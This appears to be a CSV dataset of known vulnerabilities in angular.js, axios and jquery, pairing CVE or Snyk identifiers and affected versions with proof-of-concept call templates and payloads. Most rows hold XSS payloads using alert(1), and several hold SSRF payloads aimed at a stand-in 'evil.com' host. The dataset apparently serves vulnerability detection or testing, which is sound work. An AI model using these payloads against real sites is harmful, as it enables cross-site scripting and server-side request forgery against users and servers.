"cve","package_name","versions","url","source_db","source_url","vuln_type","cwe","sink_type","gadget","poc","payload","keywords","validated"
"NOCVE-npm:angular:20180202","angular.js","{(,1.6.9)}","https://cdnjs.com/libraries/angular.js","cdnjs","https://security.snyk.io/vuln/npm:angular:20180202","xss","CWE-79","function call",False,"{$sanitize(PAYLOAD);}","{""PAYLOAD"": ""<svg xmlns=\""http://www.w3.org/2000/svg\""><a xml:base=\""javascript:alert(1)//\"" href=\""#\""></a></svg>""}",NULL,True
"NOCVE-SNYK-JS-AXIOS-9403194","axios","{(,0.30.0),[1.0.0,1.8.3)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-9403194","ssrf","CWE-918","function call",False,"{""LIBOBJ.create({baseURL: PAYLOAD1}).get(PAYLOAD2);""}","{""PAYLOAD1"": ""http://www.example.com"", ""PAYLOAD2"": ""http://www.evil.com""}",NULL,True
"CVE-2025-27152","axios","{(,0.30.0),[1.0.0,1.8.2)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-9292519","ssrf","CWE-918","function call",False,"{""LIBOBJ.create({baseURL: PAYLOAD1, allowAbsoluteUrls: false}}).get(PAYLOAD2);""}","{""PAYLOAD1"": ""http://www.example.com"", ""PAYLOAD2"": ""http://www.evil.com""}",NULL,True
"CVE-2020-7656","jquery","{(,1.9.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-569619","xss","CWE-79","file load",False,"{LIBOBJ(WILDCARD).load(PAYLOAD);}","{""PAYLOAD"": ""inject.html #inject"", ""FILE"": {""NAME"": ""inject.html"", ""CONTENT"": ""<div id=\""inject\""><script>alert(1);</script ></div>""}}",NULL,True
"CVE-2020-11023","jquery","{[1.5.1,3.5.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-565129","xss","CWE-79","function call",False,"{LIBOBJ.htmlPrefilter(PAYLOAD);}","{""PAYLOAD"": ""<style><style /><img src=x onerror=alert(1)>""}",NULL,True
"CVE-2020-11022","jquery","{[1.5.1,3.5.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-567880","xss","CWE-79","function call",False,"{LIBOBJ.htmlPrefilter(PAYLOAD);}","{""PAYLOAD"": ""<option><style></option></select><img src=x onerror=alert(1)></style>""}",NULL,True
"CVE-2024-39338","axios","{[1.3.2,1.7.4)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-7361793","ssrf","CWE-918","function call",False,"{LIBOBJ.create(WILDCARD).get(PAYLOAD);}","{""PAYLOAD"": ""//evil.com""}",NULL,True
"NOCVE-npm:angular:20171018","angular.js","{(,1.6.7)}","https://cdnjs.com/libraries/angular.js","cdnjs","https://security.snyk.io/vuln/npm:angular:20171018","xss","CWE-79","function call",False,"{$sanitize(PAYLOAD);}","{""PAYLOAD"": ""<a href=\""&#x3000;javascript:alert(1)\""></a>""}",NULL,True
"CVE-2014-6071","jquery","{[1.4.2,1.6.2)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/npm:jquery:20140902","xss","CWE-79","function call",False,"{LIBOBJ(WILDCARD).after(LIBOBJ(PAYLOAD).text());}","{""PAYLOAD"": ""element[attribute='<div>&lt;script&gt;alert(1);&lt;/script&gt;</div>']""}",NULL,True
"NOCVE-npm:angular:20161101","angular.js","{[1.5.0,1.5.9)}","https://cdnjs.com/libraries/angular.js","cdnjs","https://security.snyk.io/vuln/npm:angular:20161101","csp bypass","CWE-284","function call",False,"{""bootstrap(WILDCARD, WILDCARD, WILDCARD);""}","{}",NULL,False
